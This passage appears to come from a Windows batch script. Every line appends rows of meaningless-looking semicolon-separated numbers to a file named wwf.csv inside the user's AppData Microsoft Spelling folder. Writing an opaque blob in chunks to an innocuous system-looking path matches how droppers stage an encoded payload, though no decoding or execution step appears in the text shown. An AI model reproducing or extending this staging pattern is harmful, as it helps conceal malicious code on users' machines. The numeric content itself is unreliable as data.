>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(21.728;0.31;0.3466;809.32;30.0;70.0;3758.845;0.467;19.815;63.8644;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.0;833.32;50.0;3963.30;0.847;0.438;12.0212;820.63;31.0;848.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5141.70;0.40;0.847;0.5581;538.12;827.63;43.0;0492.903;32.40;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7942;847.0;638.12;848.0;2044.66;0.916;32.60;0.1426;50.0;847.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(338.12;6751.836;63.57;0.953;32.7680;30.0;30.0;845.24;5511.521;21.948;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.39;0.0069;955.32;70.0;40.0;2184.850;8.773;13.843;63.9959;79.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(423.33;30.0;3306.40;0.829;24.715;21.7575;528.0;39.0;337.33;1586.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.834;0.2212;373.11;617.0;69.0;3501.598;33.30;0.40;0.1587;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(898.0;807.10;617.0;7356.510;0.808;33.70;0.0606;60.0;898.0;944.22;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3172.848;63.711;0.953;32.8491;60.0;30.0;845.24;5983.421;21.948;0.412;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1163;948.33;60.0;60.0;3334.850;8.473;13.854;63.3427;312.0;616.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;0683.70;0.829;24.715;21.2756;728.0;312.0;532.34;1289.30;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.834;0.1293;899.17;859.63;312.0;0698.953;32.30;0.60;0.0011;845.24;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(321.21;948.0;5940.513;0.488;35.50;0.1304;50.0;850.8;773.13;3729.866;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.513;0.812;35.6524;50.0;60.0;829.24;4607.715;21.328;0.513;0.7863;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(840.35;30.0;60.0;1089.898;0.807;10.517;0.3453;513.0;923.35;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4506.50;0.834;8.900;6.4282;807.0;514.0;953.32;7993.30;0.70;0.845;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(24.1054;321.21;948.0;714.0;4852.952;35.60;0.60;0.3874;850.8;573.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(871.63;3713.314;0.520;36.60;0.5562;30.0;829.24;715.21;1725.628;0.314;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.348;36.0113;30.0;70.0;898.0;2109.807;10.617;0.514;0.1513;476.36;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;40.0;6583.898;0.944;22.848;63.3591;415.0;953.32;50.0;0485.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.845;24.321;21.0336;948.0;416.0;927.36;5125.30;0.70;0.845;24.2913;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(321.21;948.0;416.0;4063.43;37.50;0.30;0.6992;850.8;773.13;876.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3437.716;0.527;37.60;0.3556;30.0;829.24;315.21;0675.628;0.716;0.472;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.1067;40.0;40.0;898.0;7641.807;10.417;0.716;0.1988;855.37;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;6658.834;8.932;27.818;0.2991;317.0;880.37;50.0;7385.50;0.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.854;11.8631;818.0;617.0;905.37;1092.50;0.70;0.850;8.9186;373.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(881.63;417.0;5891.929;37.40;0.40;0.2410;829.24;615.21;528.0;2937.417;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.61;38.40;0.0338;30.0;898.0;807.10;8450.617;0.717;0.364;38.0780;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;60.0;834.0;0811.363;23.918;0.318;0.4507;953.32;50.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3725.845;24.321;21.948;0.9512;618.0;416.39;50.0;6990.70;0.850;8.473;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.1093;886.63;418.0;740.39;0902.70;0.50;0.829;24.9460;415.21;428.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(718.0;4966.568;39.70;0.50;0.4936;898.0;807.10;417.0;3049.418;0.832;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(39.70;0.2210;60.0;834.0;891.22;5780.848;63.619;0.953;32.6342;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;845.24;7942.621;21.948;0.720;0.0413;448.40;30.0;40.0;5307.850;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.773;13.891;63.4692;720.0;572.40;70.0;3889.40;0.829;24.415;21.9992;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(628.0;720.0;800.40;3328.50;0.70;0.898;0.0667;807.10;717.0;520.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6130.864;40.30;0.60;0.2116;898.0;944.22;848.63;6600.621;0.953;32.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6099;50.0;845.24;321.21;2805.948;0.722;0.532;41.4385;40.0;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(845.24;0824.721;21.948;0.522;0.1866;364.41;50.0;70.0;3238.850;8.373;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.896;63.7141;722.0;688.41;30.0;8042.70;0.829;24.415;21.8093;728.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(522.0;824.41;7326.40;0.50;0.898;0.2615;807.10;517.0;422.0;8432.908;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.50;0.60;0.3895;898.0;944.22;848.63;3044.523;0.47;42.70;0.2264;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;845.24;521.21;6911.948;0.524;0.539;42.0076;60.0;70.0;850.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6438.473;13.901;63.724;0.5361;363.42;70.0;60.0;6836.829;24.315;21.428;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3483;624.0;808.42;30.0;9101.30;0.898;0.807;10.2201;617.0;724.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(892.42;0867.60;0.30;0.898;0.5217;944.22;848.63;725.0;8653.955;42.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.0120;850.8;473.13;906.63;6749.626;0.523;43.70;0.5442;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(829.24;615.21;3146.528;0.326;0.444;43.0103;60.0;50.0;898.0;4829.807;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.617;0.526;0.7812;828.43;70.0;40.0;4147.898;0.944;22.848;63.1638;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(527.0;953.32;70.0;3445.50;0.845;24.621;21.0143;948.0;428.0;620.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6638.50;0.40;0.850;8.4841;373.13;911.63;528.0;9278.744;44.40;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6483;829.24;315.21;528.0;6623.428;0.464;44.70;0.0856;50.0;898.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.10;0886.417;0.728;0.848;44.1891;50.0;60.0;898.0;7981.944;22.848;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.429;0.7879;953.32;70.0;70.0;0764.845;24.421;21.948;0.0968;430.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(640.45;30.0;7484.30;0.845;24.521;21.4148;948.0;630.0;472.45;2789.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;0.850;8.6226;773.13;916.63;630.0;9252.796;45.40;0.40;0.2404;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(829.24;715.21;428.0;2196.730;0.816;45.60;0.6793;40.0;898.0;807.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7552.517;0.330;0.900;45.5763;40.0;40.0;898.0;9293.944;22.848;63.331;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0441;792.46;60.0;30.0;5583.850;8.473;13.921;63.4014;332.0;816.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;4600.50;0.829;24.415;21.4108;728.0;632.0;844.46;0956.70;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.850;0.8002;755.19;948.0;632.0;3517.940;46.60;0.40;0.3221;850.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(924.18;948.0;6362.332;0.953;32.70;0.7909;30.0;845.24;321.21;0564.948;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.632;0.855;49.6025;70.0;60.0;850.8;9300.373;13.926;63.732;0.4716;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(879.49;70.0;60.0;1498.829;24.415;21.428;0.3742;732.0;953.32;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7332.70;0.845;24.721;21.6463;948.0;732.0;907.49;1770.50;0.60;0.850;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.7784;673.13;931.63;432.0;8257.931;49.60;0.30;0.7834;829.24;615.21;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(428.0;1697.532;0.953;32.30;0.7795;50.0;845.24;321.21;9634.948;0.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.73;50.8087;30.0;70.0;845.24;6448.621;21.948;0.432;0.4723;435.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;40.0;8135.850;8.573;13.936;63.3025;532.0;659.50;70.0;5329.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.829;24.515;21.3413;328.0;732.0;804.50;8512.40;0.50;0.898;0.0569;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.10;317.0;532.0;3188.888;50.50;0.50;0.6991;898.0;944.22;848.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4057.333;0.385;51.70;0.4039;30.0;845.24;421.21;4675.948;0.734;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.5143;50.0;50.0;850.8;8561.773;13.941;63.634;0.7888;841.51;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;6231.829;24.715;21.328;0.5673;634.0;888.51;40.0;9526.30;0.898;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.807;10.1312;417.0;534.0;416.52;0629.70;0.30;0.898;0.3777;944.22;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(848.63;435.0;0394.869;52.50;0.70;0.2285;832.24;515.21;322.0;8663.436;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.902;52.30;0.8312;50.0;834.8;864.6;6862.807;0.538;0.910;52.9999;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;70.0;834.8;6023.632;7.807;0.338;0.8866;918.52;60.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1552.834;8.919;22.918;0.5960;738.0;953.32;40.0;1728.50;0.898;1.944;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(22.7592;848.63;338.0;926.52;8951.40;0.50;0.898;1.4611;807.10;417.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(539.0;8269.944;52.70;0.40;0.2189;847.0;954.5;946.63;2270.740;0.540;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.60;0.1586;50.0;847.0;830.22;7718.953;63.742;0.920;53.4007;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;847.0;1057.800;25.310;64.644;0.9151;924.54;30.0;70.0;1643.847;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.873;6.619;64.3389;747.0;531.55;50.0;6961.70;0.847;0.939;6.2180;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(619.64;749.0;484.55;7703.60;0.70;0.847;0.3095;455.17;526.64;751.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1187.884;55.30;0.30;0.2976;847.0;568.17;848.0;4226.452;0.924;55.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0423;50.0;847.0;824.21;6534.848;0.353;0.820;56.3747;50.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(845.0;5432.784;13.333;64.554;0.6091;928.56;50.0;60.0;3501.829;24.415;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(21.328;0.0433;455.0;936.56;70.0;8860.40;0.845;0.40;17.6172;539.64;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(655.0;644.61;8423.40;0.60;0.845;24.5365;721.21;948.0;356.0;5303.466;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.30;0.30;0.6447;847.0;830.5;445.64;1696.756;0.780;61.60;0.7969;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;847.0;830.5;0703.354;64.557;0.912;61.8855;30.0;70.0;845.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4724.857;5.754;64.759;0.4118;592.62;70.0;60.0;8046.847;0.871;19.764;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.7306;561.0;805.62;60.0;9763.60;0.847;0.871;19.6427;772.64;662.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(844.62;8506.30;0.40;0.847;0.6293;924.5;381.64;664.0;0103.900;62.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.9409;847.0;924.5;389.64;3107.365;0.954;62.70;0.1879;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(845.24;421.21;7498.948;0.566;0.50;0.7366;61.0;362.7;70.0;7962.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.441;23.60;0.4485;71.0;896.7;70.0;9944.52;0.362;7.50;0.0866;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.0;441.23;40.0;2501.51;0.362;7.40;0.0843;41.0;896.7;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1618.62;0.462;7.30;0.1909;51.0;814.25;70.0;6180.41;0.843;11.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0980;71.0;826.24;30.0;4338.41;0.845;24.50;0.9966;41.0;843.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;0864.71;0.843;11.70;0.1301;61.0;826.24;60.0;0168.61;0.843;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(11.50;0.1258;41.0;843.11;40.0;7017.61;0.843;11.40;0.9655;71.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(826.24;40.0;4448.71;0.843;11.60;0.6752;61.0;826.24;70.0;8070.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.843;11.70;0.2456;51.0;826.24;70.0;4203.41;0.843;11.30;0.5879;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.0;826.24;70.0;0919.61;0.843;11.50;0.5099;51.0;826.24;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5405.41;0.843;11.70;0.5540;61.0;826.24;70.0;8145.41;0.843;11.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8216;51.0;826.24;30.0;1723.31;0.843;11.30;0.9358;61.0;826.24;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;7543.31;0.843;11.40;0.5120;61.0;826.24;30.0;4781.61;0.928;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.50;0.1947;32.0;646.7;30.0;5882.41;0.826;24.60;0.0935;41.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(843.11;50.0;4282.31;0.843;11.60;0.5405;42.0;930.22;30.0;3277.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.936;4.70;0.0029;32.0;857.22;70.0;8494.71;0.814;25.72;0.1082;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.0;928.6;32.0;6700.33;0.819;11.50;0.6419;61.0;919.6;62.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6375.42;0.887;6.70;0.5206;61.0;610.7;72.0;5158.62;0.953;6.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9064;51.0;832.7;70.0;5096.31;0.889;14.30;0.2590;41.0;889.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;2345.41;0.494;13.30;0.1673;31.0;741.23;30.0;3926.51;0.832;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7.60;0.7955;71.0;832.7;50.0;0292.42;0.539;17.30;0.3567;41.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(832.7;30.0;2371.72;0.439;17.30;0.3973;61.0;945.5;30.0;3066.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.945;5.30;0.1929;72.0;639.17;30.0;6321.61;0.801;19.60;0.7881;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.0;945.5;49.0;7362.715;21.71;0.517;0.5554;415.21;66.0;433.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4386.415;21.312;0.741;0.2611;315.21;612.0;649.0;4848.715;21.617;0.457;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1680;315.21;317.0;565.0;0238.315;21.317;0.473;0.4076;615.21;717.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(581.0;8823.515;21.517;0.689;0.7970;615.21;417.0;497.0;3426.315;21.717;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.805;0.5396;515.21;417.0;813.0;1399.715;21.717;0.821;0.1949;415.21;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(417.0;829.0;3746.615;21.412;0.837;0.4915;515.21;717.0;845.0;4504.515;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(21.722;0.853;0.3914;515.21;428.0;869.0;1160.715;21.532;0.893;0.2978;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(715.21;728.0;717.1;7609.515;21.617;0.533;1.7178;615.21;628.0;877.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9569.515;21.328;0.829;1.5258;898.27;538.0;885.0;0948.715;21.444;0.901;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0649;856.7;552.0;885.0;7186.438;12.563;0.837;1.2940;54.25;470.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(837.1;3798.894;14.485;0.581;1.2445;415.21;717.0;933.0;2540.541;4.589;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.853;1.0664;715.21;728.0;933.0;5688.852;25.385;0.933;0.5773;947.20;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.0;917.0;7804.840;25.807;0.909;0.3928;623.24;807.0;837.1;6504.953;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(24.811;0.909;0.0743;743.24;417.0;917.0;0051.918;26.818;0.925;0.4600;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(617.8;628.0;837.1;7420.809;28.822;0.933;0.7579;715.21;328.0;837.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3601.432;25.841;0.869;1.2985;75.17;848.0;837.1;4694.837;7.853;0.901;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0778;877.7;752.0;885.1;4534.715;21.617;0.933;0.7705;79.19;728.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(933.0;2828.913;15.862;0.909;0.4068;904.7;807.0;893.1;1638.795;7.871;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.901;1.3136;515.21;617.0;837.1;4025.685;23.876;0.837;1.9620;938.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(912.0;909.1;3426.866;22.918;0.909;1.8797;688.17;612.0;909.0;7560.922;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7.717;0.837;1.6754;892.11;929.0;837.1;7163.953;24.934;0.837;1.3156;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(953.24;940.0;893.1;1245.695;7.948;0.837;1.1002;845.23;952.0;837.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7016.953;24.41;1.837;1.3093;722.5;47.1;837.1;4930.443;25.807;0.512;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4698;862.27;441.1;612.0;6611.913;15.747;1.837;1.6403;463.24;358.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(837.1;0955.648;12.862;0.837;1.4731;431.28;663.1;837.1;4483.905;14.876;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.837;1.1369;548.12;669.1;949.0;7475.515;21.617;0.917;1.1388;942.24;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(818.0;917.1;1749.419;7.807;0.869;1.5619;315.19;780.1;837.1;8425.940;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.912;0.925;1.6015;946.24;483.1;71.1;5263.885;27.693;1.829;1.8560;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(619.7;807.0;837.1;9861.892;11.499;1.837;1.2158;888.11;589.0;79.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9163.715;21.71;0.69;1.2497;948.4;816.1;877.0;3114.329;12.807;0.412;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5159;922.15;823.1;320.0;6662.741;4.839;1.909;0.3205;715.21;428.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(420.0;1795.947;20.891;1.728;0.6505;840.25;909.1;428.0;0497.918;26.818;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.909;0.1085;746.23;918.0;641.1;0280.615;21.628;0.909;1.4169;53.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.0;909.1;2498.329;6.612;0.909;1.3391;612.28;317.0;933.0;9029.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.914;1.341;1.7216;838.6;921.1;549.1;8027.856;24.931;1.941;1.6287;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(883.24;818.0;941.1;2646.425;23.818;0.69;1.8045;515.21;528.0;949.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3097.947;20.937;1.665;1.0959;840.25;943.1;673.1;4216.415;12.818;0.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.7176;894.14;485.0;465.1;8495.918;26.818;0.481;1.2460;881.5;807.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(612.0;7529.615;21.428;0.620;0.4406;715.21;428.0;837.1;9887.801;28.483;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.51;1.9109;470.6;54.2;71.1;4391.374;28.713;2.59;2.5054;715.21;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(628.0;325.2;2431.315;21.628;0.733;2.2071;815.5;523.2;536.0;4831.615;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(21.628;0.436;0.6185;541.4;823.1;333.2;7073.815;5.738;2.641;2.4204;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(868.20;664.2;444.0;1633.515;21.428;0.744;0.7547;831.11;789.2;652.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8494.315;21.328;0.444;0.5957;641.4;823.1;352.0;6674.831;11.489;2.752;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6109;541.4;823.1;441.2;9409.638;25.808;2.813;1.4833;804.5;821.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.1;7519.911;5.807;0.614;0.8163;412.0;657.3;314.0;6982.416;0.692;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.314;0.9175;620.0;851.3;414.0;6338.424;0.890;3.314;0.6982;528.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(943.3;714.0;2870.532;0.538;4.514;0.5607;536.0;587.4;414.0;8718.740;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.828;4.714;0.6518;644.0;875.4;714.0;5347.348;0.930;4.614;0.9708;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(752.0;527.5;614.0;2829.356;0.754;5.714;0.7682;760.0;785.5;514.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3218.564;0.838;5.714;0.7496;568.0;857.5;714.0;0233.672;0.884;5.614;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9688;676.0;929.5;714.0;5177.780;0.54;6.414;0.1741;484.0;735.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.0;8444.788;0.666;6.714;0.9013;692.0;497.6;714.0;1363.796;0.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.514;0.3902;800.0;861.6;514.0;9455.804;0.894;6.714;0.1458;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(931.6;714.0;5767.812;0.48;7.514;0.8183;816.0;441.7;614.0;0824.820;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.674;7.314;0.9534;824.0;809.7;314.0;8966.828;0.844;7.714;0.5811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(832.0;873.7;414.0;7818.836;0.904;7.314;0.2437;840.0;935.7;514.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0601.844;0.610;8.514;0.2646;848.0;341.8;314.0;5162.852;0.672;8.414;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2675;856.0;803.8;514.0;6533.860;0.834;8.614;0.6859;864.0;865.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.0;0644.868;0.896;8.314;0.2602;872.0;929.8;614.0;8907.876;0.36;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9.514;0.2832;880.0;339.9;414.0;4451.884;0.772;9.614;0.6766;888.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.9;314.0;5799.892;0.850;9.314;0.3476;896.0;885.9;514.0;1836.900;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.922;9.714;0.7775;904.0;33.10;714.0;0838.908;0.450;10.514;0.1037;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(912.0;697.10;314.0;1408.916;0.844;10.314;0.3116;920.0;871.10;414.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4281.924;0.900;10.614;0.4193;928.0;929.10;714.0;6033.932;0.32;11.414;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4880;936.0;433.11;414.0;2150.940;0.572;11.614;0.3773;944.0;787.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(414.0;0624.948;0.804;11.414;0.2470;952.0;839.11;514.0;4659.70;1.876;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(11.414;0.6460;34.1;913.11;414.0;5667.38;1.934;11.714;0.1358;512.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.12;414.0;2963.416;1.518;12.314;0.1394;420.1;325.12;514.0;6198.424;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.748;12.314;0.8751;528.1;573.12;314.0;3263.732;1.800;12.514;0.5474;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(336.1;829.12;314.0;6405.640;1.854;12.714;0.5094;544.1;881.12;414.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1761.448;1.900;12.414;0.1471;652.1;921.12;414.0;2320.356;1.928;12.514;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1809;560.1;933.12;314.0;1878.464;1.52;13.714;0.2971;568.1;529.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.0;2476.572;1.346;13.714;0.7240;676.1;465.13;314.0;7868.480;1.470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.414;0.3991;484.1;675.13;714.0;7087.788;1.396;13.514;0.3097;792.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.13;714.0;3940.596;1.840;13.414;0.1652;800.1;863.13;414.0;8134.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.878;13.714;0.8820;808.1;903.13;514.0;7488.812;1.922;13.514;0.8229;
